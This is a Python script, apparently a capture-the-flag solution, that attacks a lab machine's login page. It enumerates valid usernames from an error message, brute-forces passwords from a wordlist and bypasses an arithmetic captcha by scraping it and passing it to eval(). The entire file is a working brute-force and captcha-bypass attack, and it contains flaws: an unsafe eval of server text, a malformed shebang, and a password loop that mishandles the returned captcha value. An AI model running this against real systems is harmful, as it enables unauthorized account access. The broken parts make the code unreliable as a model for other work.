#!/usr/env/python3
import requests

# The URL (Edit the IP to your challenge IP!)
# Be sure to click the login button until it warns you with captcha. After that, run this script.
url = 'http://10.10.XX.XX/login'

def calculate(captcha):
	captcha = captcha.strip("  ")
	captcha = captcha.split(" ")
	calculate = f"{int(captcha[0])} {str(captcha[1])} {int(captcha[2])}"
	return captcha, eval(calculate)
				
def send(mode,username,password,captcha):
	found = False

	# The data to post.
	data = {
	    'username': username,
	    'password': password,
	    'captcha': captcha
	}

	response = requests.post(url, data=data)
	response_line = response.text.split("\n")
	
	
	captcha = ""
	for line_nr in range(len(response_line)):
	
		# Put the next line in the captcha buffer.
		if response_line[line_nr] == '    <label for="usr"><b><h3>Captcha enabled</h3></b></label><br>':
			captcha = response_line[line_nr+1]
			break
		
	if mode == "password":
		if not "Invalid password" in response.text:
			print(f"\nFound: {username} - {password}")
			exit(1)
			
	captcha, answer = calculate(captcha)
	if mode != "":
		print(f"Enumerating {mode}: {username:10} {'-' if mode == 'password' else '':2} {password:10} Captcha: {captcha[0]:2} {str(captcha[1]):2} {captcha[2]:2} = {answer}")
	
	if mode == "username":
		if not "does not exist" in response.text:
			print(f"\nFound: {username}")
			return answer,True

	return answer,False


if __name__ == "__main__":
	
	# Synch Captcha
	c ,found = send("usernames","","",0)
	found = False
	print("Synched the Captcha!")
	with open("usernames.txt","r") as user_file:
		for u in user_file:
			u = u.strip("\n")
			c,found = send("username",u.strip("\n"),"",c)
			if found:
				break
	if not found:
		print("Did not find user..")
		exit(0)
	
	with open("passwords.txt","r") as password_file:
		for p in password_file:
			c = send("password",u,p.strip("\n"),c)
